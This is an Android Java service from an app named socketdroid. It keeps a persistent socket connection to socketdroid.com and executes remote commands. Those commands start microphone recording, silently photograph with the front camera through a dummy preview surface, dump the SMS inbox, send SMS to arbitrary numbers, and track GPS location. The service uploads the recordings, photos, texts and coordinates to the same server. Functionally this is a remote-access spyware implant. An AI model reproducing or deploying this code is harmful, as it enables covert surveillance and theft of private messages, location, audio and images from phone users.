package com.socketdroid.mastashake08.socketdroid;

import android.Manifest;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import com.loopj.android.http.*;

import android.database.Cursor;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioFormat;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.SystemClock;
import android.os.Vibrator;
import android.preference.PreferenceActivity;
import android.preference.PreferenceManager;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.NotificationCompat;
import android.support.v4.app.TaskStackBuilder;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.SurfaceHolder;
import android.widget.Toast;

import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.drafts.Draft_10;
import org.java_websocket.drafts.Draft_17;
import org.java_websocket.framing.Framedata;
import org.java_websocket.handshake.ServerHandshake;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Timer;

import cz.msebera.android.httpclient.Header;
import io.socket.client.Ack;
import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;
import android.hardware.camera2.*;

import static android.provider.MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE;
import static android.provider.MediaStore.Files.FileColumns.MEDIA_TYPE_VIDEO;

/**
 * Created by TutorialsPoint7 on 8/23/2016.
 */

public class MyService extends Service {
    Socket socket;
    MediaRecorder mRecorder = null;
    String mFileName;
    static Handler handler = null;
    LocationManager locationManager = null;
    LocationListener locationListener = null;
    File pictureFile;
    private Thread recordingThread = null;
    private boolean isRecording = false;



    final AsyncHttpClient client = new AsyncHttpClient(true,80,443);

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void showNotification(JSONObject obj) throws JSONException {
        int mId = (int) Math.random() * 100 ;
        NotificationCompat.Builder mBuilder =
                new NotificationCompat.Builder(MyService.this.getApplicationContext())
                        .setSmallIcon(R.drawable.notification)
                        .setContentTitle(obj.getString("title"))
                        .setContentText(obj.getString(("message")));
// Creates an explicit intent for an Activity in your app
        Intent resultIntent = new Intent(MyService.this.getApplicationContext(), MainActivity.class);

// The stack builder object will contain an artificial back stack for the
// started Activity.
// This ensures that navigating backward from the Activity leads out of
// your application to the Home screen.
        TaskStackBuilder stackBuilder = TaskStackBuilder.create(MyService.this.getApplicationContext());
// Adds the back stack for the Intent (but not the Intent itself)
        stackBuilder.addParentStack(MainActivity.class);
// Adds the Intent that starts the Activity to the top of the stack
        stackBuilder.addNextIntent(resultIntent);
        PendingIntent resultPendingIntent =
                stackBuilder.getPendingIntent(
                        0,
                        PendingIntent.FLAG_UPDATE_CURRENT
                );
        mBuilder.setContentIntent(resultPendingIntent);
        NotificationManager mNotificationManager =
                (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
// mId allows you to update the notification later on.
        mNotificationManager.notify(mId, mBuilder.build());
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        // Let it continue running until it is stopped.
        Toast.makeText(this, "Service Started", Toast.LENGTH_LONG).show();

        try {
            connectWebSocket();
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        disconnectWebSocket();
        Toast.makeText(this, "Service Destroyed", Toast.LENGTH_LONG).show();
    }

    private void disconnectWebSocket() {
        SharedPreferences prefs = getSharedPreferences("com.socketdroid.mastashake08.socketdroid",MODE_PRIVATE);
        socket.disconnect();
        socket.off(prefs.getString("id",""));
        socket.off("notification");
        prefs.edit().putBoolean("service-running",false).commit();
    }
    private Camera.PictureCallback mPicture = new Camera.PictureCallback() {

        @Override
        public void onPictureTaken(byte[] data, Camera camera) {

            pictureFile = getOutputMediaFile(MEDIA_TYPE_IMAGE);
            if (pictureFile == null){

                return;
            }

            try {
                FileOutputStream fos = new FileOutputStream(pictureFile);
                fos.write(data);
                fos.close();
                sendFile();
            } catch (FileNotFoundException e) {
                Log.d("Camera", "File not found: " + e.getMessage());
            } catch (IOException e) {
                Log.d("Camera", "Error accessing file: " + e.getMessage());
            }
        }
    };

    /** Create a File for saving an image or video */
    private File getOutputMediaFile(int type){
        // To be safe, you should check that the SDCard is mounted
        // using Environment.getExternalStorageState() before doing this.

        File mediaStorageDir = new File(Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_PICTURES), "MyCameraApp");
        // This location works best if you want the created images to be shared
        // between applications and persist after your app has been uninstalled.

        // Create the storage directory if it does not exist
        if (! mediaStorageDir.exists()){
            if (! mediaStorageDir.mkdirs()){
                Log.d("MyCameraApp", "failed to create directory");
                return null;
            }
        }

        // Create a media file name
        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
        File mediaFile;
        if (type == MEDIA_TYPE_IMAGE){
            mFileName = mediaStorageDir.getPath() + File.separator +
                    "IMG_"+ timeStamp + ".jpg";
            mediaFile = new File(mFileName);


        } else if(type == MEDIA_TYPE_VIDEO) {
            mediaFile = new File(mediaStorageDir.getPath() + File.separator +
                    "VID_"+ timeStamp + ".mp4");
        } else {
            return null;
        }

        return mediaFile;
    }



    /**
     * Start websocket connection
     */
    private void connectWebSocket() throws URISyntaxException {

        final SharedPreferences prefs = getSharedPreferences("com.socketdroid.mastashake08.socketdroid", MODE_PRIVATE);
        Log.i("UUID",prefs.getString("id",""));
        Log.i("Websocket", "Connecting...");
        URI uri = new URI("https://socketdroid.com:6001");
        socket = IO.socket(uri);

        socket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {

            @Override
            public void call(Object... args) {
                Log.i("Socket", "Connected!");
                prefs.edit().putBoolean("service-running",true).commit();

            }

        }).on("notification",new Emitter.Listener(){

            @Override
            public void call(Object... args) {
                final JSONObject obj = (JSONObject) args[0];
                try {
                    showNotification(obj.getJSONObject("data"));
                } catch (JSONException e) {
                    e.printStackTrace();
                }

            }


        }).on(prefs.getString("id",""), new Emitter.Listener() {
            private void startGPS(LocationListener locationListener) {
                Log.i("GPS", "Getting...");
                // Acquire a reference to the system Location Manager
                locationManager = (LocationManager) MyService.this.getSystemService(Context.LOCATION_SERVICE);

                // Define a listener that responds to location updates
                final LocationListener finalLocationListener = locationListener;
                locationListener = new LocationListener() {
                    public void onLocationChanged(final Location location) {
                        // Called when a new location is found by the network location provider.
                        handler = new Handler(Looper.getMainLooper());

                        handler.post(new Runnable() {

                            @Override
                            public void run() {
                                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, finalLocationListener);

                                RequestParams params = new RequestParams();
                                //"photos" is Name of the field to identify file on server
                                params.put("lat", location.getLatitude());
                                params.put("long", location.getLongitude());
                                //TODO: Reaming body with id "property". prepareJson converts property class to Json string. Replace this with with your own method
                                client.post(MyService.this.getApplicationContext(), "https://socketdroid.com/post-gps", params, new AsyncHttpResponseHandler() {
                                    @Override
                                    public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                                        Log.i("HTTP", "Failed..");
                                    }

                                    @Override
                                    public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                                        Log.i("HTTP", "Success..");
                                    }
                                });
                            }
                        });

                    }

                    public void onStatusChanged(String provider, int status, Bundle extras) {
                    }

                    public void onProviderEnabled(String provider) {
                    }

                    public void onProviderDisabled(String provider) {
                    }
                };

                // Register the listener with the Location Manager to receive location updates

                //

                String locationProvider = LocationManager.GPS_PROVIDER;
                // Or use LocationManager.GPS_PROVIDER


                final Location lastKnownLocation = locationManager.getLastKnownLocation(locationProvider);


                Log.i("GPS", "Latitude" + lastKnownLocation.getLatitude());
                Log.i("GPS", "Longitude" + lastKnownLocation.getLongitude());
                handler = new Handler(Looper.getMainLooper());

                handler.post(new Runnable() {

                    @Override
                    public void run() {


                        RequestParams params = new RequestParams();
                        //"photos" is Name of the field to identify file on server
                        params.put("lat", lastKnownLocation.getLatitude());
                        params.put("long", lastKnownLocation.getLongitude());
                        //TODO: Reaming body with id "property". prepareJson converts property class to Json string. Replace this with with your own method
                        client.post(MyService.this.getApplicationContext(), "https://socketdroid.com/post-gps", params, new AsyncHttpResponseHandler() {
                            @Override
                            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                                Log.i("HTTP", "Failed..");
                            }

                            @Override
                            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                                Log.i("HTTP", "Success..");
                            }
                        });
                    }
                });
            }






            private void stopGPS(LocationListener locationListener) {
                locationManager.removeUpdates(locationListener);
            }

            private void getSMS(final SharedPreferences prefs) {
                handler = new Handler(Looper.getMainLooper());



                handler.post(new Runnable() {

                    @Override
                    public void run(){
                        JSONArray texts = getTexts();
                        RequestParams params = new RequestParams();
                        //"photos" is Name of the field to identify file on server
                        params.put("texts",texts);
                        params.put("phone",prefs.getString("id",""));
                        //TODO: Reaming body with id "property". prepareJson converts property class to Json string. Replace this with with your own method
                        client.post(MyService.this.getApplicationContext(), "https://socketdroid.com/post-texts", params, new AsyncHttpResponseHandler() {
                            @Override
                            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                                Log.i("HTTP", "Failed..");
                            }

                            @Override
                            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                                Log.i("HTTP", "Success..");
                            }
                        });

                    }
                });
            }

            private void sendSMS(JSONObject obj) {
                Log.i("SMS", "Sending...");
                String text = null;
                try {
                    text = obj.getJSONObject("data").getString("text");
                    String phone = obj.getJSONObject("data").getString("phone");
                    SmsManager smsManager = SmsManager.getDefault();
                    smsManager.sendTextMessage(phone, null, text, null, null);
                } catch (JSONException e) {
                    e.printStackTrace();
                }


            }

            private void getBatteryLevel() {
                IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
                Intent batteryStatus = MyService.this.getApplicationContext().registerReceiver(null, ifilter);
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);

                final float batteryPct = level / (float)scale;
                handler = new Handler(Looper.getMainLooper());

                handler.post(new Runnable() {

                    @Override
                    public void run() {


                        RequestParams params = new RequestParams();
                        //"photos" is Name of the field to identify file on server
                        params.put("battery",batteryPct);
                        //TODO: Reaming body with id "property". prepareJson converts property class to Json string. Replace this with with your own method
                        client.post(MyService.this.getApplicationContext(), "https://socketdroid.com/post-battery", params, new AsyncHttpResponseHandler() {
                            @Override
                            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                                Log.i("HTTP", "Failed..");
                            }

                            @Override
                            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                                Log.i("HTTP", "Success..");
                            }
                        });
                    }
                });

            }

            private void stopAudioRecording(MediaRecorder mRecorder, String mFilename, final SharedPreferences prefs) {
                handler = new Handler(Looper.getMainLooper());
                mRecorder.stop();
                mRecorder.release();
                mRecorder = null;
                isRecording = false;
                recordingThread = null;
               // stopStreamingAudio(mFileName);

                handler.post(new Runnable() {

                    @Override
                    public void run() {
                        // Creates a Async client.


                        //New File
                        File files = new File(mFileName);
                        RequestParams params = new RequestParams();
                        try {
                            //"photos" is Name of the field to identify file on server
                            params.put("audio", files);
                            params.put("phone",prefs.getString("id",""));
                        } catch (FileNotFoundException e) {
                            //TODO: Handle error
                            e.printStackTrace();
                        }
                        //TODO: Reaming body with id "property". prepareJson converts property class to Json string. Replace this with with your own method
                        client.post(MyService.this.getApplicationContext(), "https://socketdroid.com/audio-upload", params, new AsyncHttpResponseHandler() {
                            @Override
                            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                                Log.i("HTTP", "Failed..");
                                mFileName = "";
                            }

                            @Override
                            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                                Log.i("HTTP", "Success..");
                                mFileName = "";
                            }
                        });

                    }
                });

            }

            private void takePhoto() {

                Log.i("Camera","Called");

                Camera c = null;
                try {
                    c = Camera.open(1); // attempt to get a Camera instance
                    c.setPreviewTexture(new SurfaceTexture(0));
                    c.startPreview();
                    c.takePicture(null, null, mPicture);
                    Log.i("Camera","taken");

                }
                catch (Exception e){
                    // Camera is not available (in use or does not exist)
                }

            }

            private void vibrateDevice() {
                // Get instance of Vibrator from current Context
                Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);

                // Vibrate for 300 milliseconds
                v.vibrate(500);
            }

            private void startAudioRecording(final String mFileName) {

                    mRecorder = new MediaRecorder();



                try {
                    mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                    mRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                    mRecorder.setOutputFile(mFileName);
                    mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                    mRecorder.setAudioEncodingBitRate(AudioFormat.ENCODING_PCM_16BIT);

                    mRecorder.prepare();

                    isRecording = true;
                    recordingThread = new Thread(new Runnable() {
                        public void run() {
                            mRecorder.start();
                            //startStreamingAudio(mFileName);
                        }
                    }, "AudioRecorder Thread");

                   
                    recordingThread.start();
                }  catch (IOException e) {
                    Log.e("audio", "prepare() failed");
                }


            }

            private void stopStreamingAudio(String mFileName) {

            }

            private void startStreamingAudio(String mFileName) {

                SharedPreferences prefs = getSharedPreferences("com.socketdroid.mastashake08.socketdroid", MODE_PRIVATE);
                int i = 0;

                byte[] buffer = new byte[1024];

                try {
                    FileInputStream fis = new FileInputStream(mFileName);
                    while(true) {

                        int in = fis.read(buffer, 0, buffer.length);

                        if(in != -1) {
                            SystemClock.sleep(1000);
                            JSONObject obj = new JSONObject();
                            byte[] audio = new byte[42];

                            Log.i("i",String.valueOf(i));
                            Log.i("Audio Buffer", String.valueOf(buffer));
                            Log.i("Audio Buffer", String.valueOf(audio));

                            obj.put("audio",audio);
                            obj.put("device-id",prefs.getString("id",""));
                            Log.i("audio-bytes", obj.toString());
                            socket.emit("audio", obj);

                        }else{
                            break;
                        }
                    }
                }catch (Exception e) {
                    Log.d("Exception", e.toString());
                }
            }


            @Override
            public void call(Object... args) {
                final JSONObject obj = (JSONObject) args[0];
                Log.i("JSON",obj.toString());

                try {
                    switch (obj.getJSONObject("data").getString("command")) {
                        case "push":
                            showNotification(obj.getJSONObject("data"));
                            break;
                        case "audio-start":
                            mFileName = Environment.getExternalStorageDirectory().getAbsolutePath();
                            Long tsLong = System.currentTimeMillis() / 1000;
                            mFileName += "/" + tsLong.toString() + ".3gp";
                           startAudioRecording(mFileName);


                            break;
                        case "audio-stop":
                            stopAudioRecording(mRecorder,mFileName,prefs);
                            break;
                        case "camera":
                            takePhoto();
                            break;
                        case "battery":

                            getBatteryLevel();
                            break;
                        case "vibrate":
                            //vibrateDevice();
                            // Get instance of Vibrator from current Context
                            Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);

                            // Vibrate for 300 milliseconds
                            v.vibrate(500);
                            break;

                        case "sms-send":
                            sendSMS(obj);
                            break;
                        case "sms":
                           getSMS(prefs);
                            break;
                        case "stop-gps":
                            stopGPS(locationListener);
                            break;
                        case "gps":
                           startGPS(locationListener);
                            break;

                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }


            }

        }).on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {

            @Override
            public void call(Object... args) {
            }

        });
        socket.connect();

    }

    private void emit(String topic, String message) {
        socket.emit(topic, message);
    }
    public void sendFile() {

        handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable() {

            @Override
            public void run() {
                // Creates a Async client.
                SharedPreferences prefs = getSharedPreferences("com.socketdroid.mastashake08.socketdroid", MODE_PRIVATE);
                //New File
                File file = new File(mFileName);
                RequestParams params = new RequestParams();
                try {
                    //"photos" is Name of the field to identify file on server
                    params.put("image", file);

                    params.put("phone",prefs.getString("id",""));
                } catch (FileNotFoundException e) {
                    //TODO: Handle error
                    e.printStackTrace();
                }
                //TODO: Reaming body with id "property". prepareJson converts property class to Json string. Replace this with with your own method
                client.post(MyService.this.getApplicationContext(), "https://socketdroid.com/image-upload", params, new AsyncHttpResponseHandler() {
                    @Override
                    public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                        Log.i("HTTP", "Failed..");

                    }

                    @Override
                    public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                        Log.i("HTTP", "Success..");
                        mFileName = "";

                    }
                });

            }
        });
    }

    public JSONArray getTexts(){
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        JSONArray resultSet = new JSONArray();
        cursor.moveToFirst();


        while (cursor.isAfterLast() == false) {
            int totalColumn = cursor.getColumnCount();
            JSONObject rowObject = new JSONObject();
            for (int i = 0; i < totalColumn; i++) {
                if (cursor.getColumnName(i) != null) {
                    try {
                        Log.i("SMS",cursor.getString(i));
                        rowObject.put(cursor.getColumnName(cursor.getColumnIndex("body")),
                                cursor.getString(cursor.getColumnIndex("body")));
                        rowObject.put(cursor.getColumnName(cursor.getColumnIndex("address")),
                                cursor.getString(cursor.getColumnIndex("address")));

                    } catch (Exception e) {
                        Log.d("SMS", e.getMessage());
                    }
                }
            }
            resultSet.put(rowObject);
            cursor.moveToNext();
        }

        cursor.close();
        return resultSet;
    }
}
